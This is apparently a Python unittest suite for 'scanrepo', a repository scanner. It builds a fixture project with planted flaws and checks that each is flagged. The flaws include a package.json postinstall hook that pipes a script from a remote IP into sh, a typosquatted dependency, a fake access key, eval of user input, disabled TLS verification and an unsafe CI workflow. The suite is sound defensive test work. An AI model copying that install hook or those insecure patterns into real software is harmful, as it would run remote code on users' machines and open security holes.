import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

from scanrepo import mcp_server
from scanrepo.cli import main as cli_main
from scanrepo.context import ScanOptions
from scanrepo.engine import scan
from scanrepo.fsutil import TargetError, classify_context, resolve_target
from scanrepo.report import to_markdown, to_sarif
from scanrepo.steps.deps import typosquat_candidate

FILES = {
    "README.md": (
        "# fastparse\n\n"
        "Zero dependencies. Fully audited by an independent firm.\n"
        "No telemetry, ever. Blazing fast: 10x faster than everything else.\n"
        "Licensed under MIT License.\n\n"
        "Install: npm install fastparse-pro\n"
    ),
    "LICENSE": "MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy...\n",
    "package.json": json.dumps({
        "name": "fastparse",
        "license": "MIT",
        "dependencies": {"lodash": "^4.17.21", "left-padd": "1.0.0"},
        "scripts": {"postinstall": "curl -s https://203.0.113.7/x.sh | sh"},
    }, indent=2),
    "src/index.js": (
        "const { PostHog } = require('posthog-node');\n"
        "const client = new PostHog('phc_x');\n"
        "fetch('https://telemetry.fastparse.io/v1/events');\n"
        "const w = new BrowserWindow({ webPreferences: { nodeIntegration: true, contextIsolation: false } });\n"
        "const key = 'AKIAZ7Q2XW4NRT5LMBV8';\n"
        "eval(userInput);\n"
    ),
    "src/cfg.py": "import requests\nr = requests.get('https://api.example-host.dev/x', verify=False)\n",
    "tests/test_index.py": "def test_ok():\n    assert True\n",
    ".env": "DATABASE_URL=postgres://x\n",
    ".github/workflows/ci.yml": (
        "on: pull_request_target\n"
        "jobs:\n  t:\n    steps:\n"
        "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
        "      - uses: some-org/tool@main\n"
    ),
}


def make_repo(files: dict[str, str]) -> Path:
    root = Path(tempfile.mkdtemp(prefix="scanrepo-test-"))
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return root


class ScanFixtureTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.root = make_repo(FILES)
        cls.report = scan(str(cls.root), ScanOptions(use_external=False))

    def ids(self):
        return {f.rule_id for f in self.report.findings}

    def claim(self, category):
        return [c for c in self.report.claims if c.category == category]

    def test_all_six_steps_run_in_order(self):
        self.assertEqual(
            [s.name for s in self.report.steps],
            ["inventory", "claims", "dependencies", "static_analysis", "behavior"],
        )
        self.assertTrue(all(s.status != "error" for s in self.report.steps), [s.notes for s in self.report.steps])

    def test_secret_is_found_and_masked(self):
        hits = [f for f in self.report.findings if f.rule_id == "secret.aws-access-key"]
        self.assertTrue(hits)
        self.assertNotIn("AKIAZ7Q2XW4NRT5LMBV8", hits[0].evidence)

    def test_dangerous_code_patterns(self):
        self.assertIn("code.electron-node-integration", self.ids())
        self.assertIn("code.electron-context-isolation-off", self.ids())
        self.assertIn("code.js-eval", self.ids())
        self.assertIn("beh.tls-verify-off-python", self.ids())

    def test_telemetry_endpoint_and_sdk_detected(self):
        self.assertIn("beh.telemetry-sdk", self.ids())
        self.assertIn("beh.telemetry-endpoint", self.ids())

    def test_claim_zero_dependencies_is_contradicted(self):
        statuses = [c.status for c in self.claim("zero_dependencies")]
        self.assertEqual(statuses, ["contradicted"])

    def test_claim_no_telemetry_is_contradicted(self):
        self.assertEqual([c.status for c in self.claim("no_telemetry")], ["contradicted"])

    def test_claim_audited_without_report_is_unsupported(self):
        self.assertEqual([c.status for c in self.claim("audited")], ["unsupported"])

    def test_claim_performance_is_unsupported(self):
        self.assertEqual([c.status for c in self.claim("performance")], ["unsupported"])

    def test_claim_license_matches_license_file(self):
        self.assertEqual([c.status for c in self.claim("license")], ["supported"])

    def test_install_script_with_download_is_high(self):
        hits = [f for f in self.report.findings if f.rule_id == "dep.install-script-suspicious"]
        self.assertTrue(hits)
        self.assertEqual(hits[0].severity, "high")

    def test_typosquat_suspect(self):
        self.assertTrue(any(f.rule_id == "dep.typosquat-suspect" and "left-pad" in f.title for f in self.report.findings))

    def test_pipeline_target_trigger_and_script_injection(self):
        self.assertIn("ci.pr-target-checkout-head", self.ids())
        self.assertIn("ci.unpinned-action-branch", self.ids())

    def test_env_file_flagged(self):
        self.assertIn("inv.env-file", self.ids())

    def test_test_files_are_weighted_down(self):
        self.assertEqual(classify_context("tests/test_index.py"), "test")
        self.assertEqual(classify_context("docs/guide.md"), "docs")
        self.assertEqual(classify_context("src/app.py"), "production")

    def test_skipped_external_tools_are_reported_as_not_checked(self):
        self.assertTrue(any("vulnerab" in n.lower() for n in self.report.not_checked))

    def test_report_declares_what_was_not_checked(self):
        self.assertTrue(self.report.not_checked)
        md = to_markdown(self.report)
        self.assertIn("Could not be checked", md)
        self.assertIn("Static scan only", md)

    def test_risk_is_high_for_this_repo(self):
        self.assertIn(self.report.risk_level, ("high", "critical"))

    def test_json_and_sarif_are_valid(self):
        json.loads(json.dumps(self.report.to_dict()))
        sarif = json.loads(to_sarif(self.report))
        self.assertEqual(sarif["version"], "2.1.0")
        self.assertTrue(sarif["runs"][0]["results"])

    def test_untrusted_text_cannot_inject_markdown_table_cells(self):
        md = to_markdown(self.report)
        for line in md.splitlines():
            if line.startswith("| ") and "Claim" not in line:
                self.assertLessEqual(line.count("|") - line.count("\\|"), 6, line)


class EdgeCaseTest(unittest.TestCase):
    def test_empty_repository_does_not_crash(self):
        root = make_repo({"x.txt": ""})
        report = scan(str(root), ScanOptions(use_external=False))
        self.assertTrue(all(s.status != "error" for s in report.steps))
        self.assertTrue(any(f.rule_id == "readme.missing" for f in report.findings))

    def test_placeholder_secrets_are_ignored(self):
        root = make_repo({"README.md": "x", "a.py": "KEY = 'AKIAIOSFODNN7EXAMPLE'\n"})
        report = scan(str(root), ScanOptions(use_external=False))
        self.assertFalse([f for f in report.findings if f.rule_id == "secret.aws-access-key"])

    def test_symlinks_are_not_followed(self):
        root = make_repo({"README.md": "x"})
        outside = make_repo({"secret.py": "eval(input())\n"})
        (root / "link").symlink_to(outside)
        report = scan(str(root), ScanOptions(use_external=False))
        self.assertFalse([f for f in report.findings if f.file and f.file.startswith("link/")])

    def test_unknown_skip_step_is_rejected(self):
        root = make_repo({"README.md": "x"})
        with self.assertRaises(ValueError):
            scan(str(root), ScanOptions(skip=frozenset({"nope"}), use_external=False))

    def test_skip_step(self):
        root = make_repo({"src/a.py": "eval(x)\n", "README.md": "x"})
        report = scan(str(root), ScanOptions(skip=frozenset({"static_analysis"}), use_external=False))
        self.assertEqual(report.steps[3].status, "skipped")
        self.assertFalse([f for f in report.findings if f.rule_id == "code.py-eval-exec"])

    def test_bad_target_is_rejected(self):
        with self.assertRaises(TargetError):
            resolve_target("not a valid target!!")

    def test_remote_target_requires_https(self):
        with self.assertRaises(TargetError):
            resolve_target("http://example.com/x/y")

    def test_typosquat_helper(self):
        self.assertEqual(typosquat_candidate("lodahs", "npm", {"lodash"}), "lodash")
        self.assertIsNone(typosquat_candidate("lodash", "npm", {"lodash"}))
        self.assertIsNone(typosquat_candidate("zzz-unrelated-pkg", "npm", {"lodash"}))

    def test_custom_rules_file(self):
        root = make_repo({"README.md": "x", "a.py": "frobnicate_widget = 1\n"})
        rules = Path(tempfile.mkdtemp()) / "rules.json"
        rules.write_text(json.dumps({"code": [{
            "id": "custom.frob", "title": "Custom frob", "pattern": "frobnicate_widget",
            "exts": ["py"], "severity": "high", "confidence": 0.9,
        }]}), encoding="utf-8")
        from scanrepo.rules import load_rules
        loaded = load_rules(str(rules))
        report = scan(str(root), ScanOptions(use_external=False, rules_file=str(rules)))
        self.assertIn("custom.frob", {f.rule_id for f in report.findings})
        self.assertTrue(loaded.groups["code"])

    def test_invalid_rules_file_reports_errors_without_crashing(self):
        root = make_repo({"README.md": "x"})
        rules = Path(tempfile.mkdtemp()) / "bad.json"
        rules.write_text(json.dumps({"code": [{"id": "bad", "pattern": "(", "severity": "high", "confidence": 0.5}]}), encoding="utf-8")
        report = scan(str(root), ScanOptions(use_external=False, rules_file=str(rules)))
        self.assertTrue(any("invalid pattern" in n for n in report.not_checked))


class CliTest(unittest.TestCase):
    def test_exit_codes_and_formats(self):
        root = make_repo(FILES)
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = cli_main([str(root), "--no-external", "-q", "--fail-on", "high", "-f", "json"])
        self.assertEqual(code, 1)
        self.assertEqual(json.loads(out.getvalue())["tool"], "scanrepo")

        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = cli_main([str(root), "--no-external", "-q"])
        self.assertEqual(code, 0)
        self.assertIn("# scanrepo report", out.getvalue())

    def test_bad_target_exit_code_2(self):
        err = io.StringIO()
        with redirect_stderr(err), redirect_stdout(io.StringIO()):
            self.assertEqual(cli_main(["nonsense target!!", "-q"]), 2)

    def test_writes_three_reports(self):
        root = make_repo({"README.md": "x", "a.py": "eval(x)\n"})
        out_dir = Path(tempfile.mkdtemp()) / "out"
        with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
            cli_main([str(root), "--no-external", "-q", "-o", str(out_dir)])
        for name in ("report.md", "report.json", "report.sarif"):
            self.assertTrue((out_dir / name).is_file(), name)


class McpTest(unittest.TestCase):
    def test_initialize_and_list(self):
        r = mcp_server.handle({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
        self.assertEqual(r["result"]["serverInfo"]["name"], "scanrepo")
        r = mcp_server.handle({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
        self.assertEqual(r["result"]["tools"][0]["name"], "scan_repo")

    def test_notification_gets_no_reply(self):
        self.assertIsNone(mcp_server.handle({"jsonrpc": "2.0", "method": "notifications/initialized"}))

    def test_scan_call(self):
        root = make_repo({"README.md": "x", "a.py": "eval(x)\n"})
        r = mcp_server.handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {
            "name": "scan_repo", "arguments": {"target": str(root), "no_external": True, "format": "json"}}})
        self.assertFalse(r["result"]["isError"])
        self.assertEqual(json.loads(r["result"]["content"][0]["text"])["tool"], "scanrepo")

    def test_bad_arguments(self):
        r = mcp_server.handle({"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "scan_repo", "arguments": {}}})
        self.assertTrue(r["result"]["isError"])
        r = mcp_server.handle({"jsonrpc": "2.0", "id": 5, "method": "nope"})
        self.assertEqual(r["error"]["code"], -32601)


class ActionSmokeTest(unittest.TestCase):
    def test_module_entrypoint_runs(self):
        root = make_repo({"README.md": "clean project\n"})
        proc = subprocess.run([sys.executable, "-m", "scanrepo", str(root), "--no-external", "-q"],
                              capture_output=True, text=True, cwd=str(Path(__file__).resolve().parents[1]), timeout=120)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("# scanrepo report", proc.stdout)


if __name__ == "__main__":
    unittest.main()
